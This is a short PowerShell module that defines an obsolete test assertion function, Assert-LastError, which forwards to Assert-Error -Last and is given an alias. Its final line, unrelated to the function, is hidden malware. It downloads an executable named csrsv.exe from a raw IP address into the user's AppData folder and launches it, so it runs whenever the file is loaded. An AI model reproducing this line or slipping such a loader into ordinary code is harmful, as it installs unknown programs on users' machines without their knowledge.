













function Assert-LastError
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true,Position=0)]
        [string]
        
        $ExpectedError, 

        [Parameter(Position=1)]
        [string]
        
        $Message
    )

    Set-StrictMode -Version 'Latest'

    Write-Warning 'OBSOLETE.  Use `Assert-Error -Last` instead.'

    Assert-Error -Last -Regex $ExpectedError
}
Set-Alias -Name 'Assert-LastPipelineError' -Value 'Assert-LastError'

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

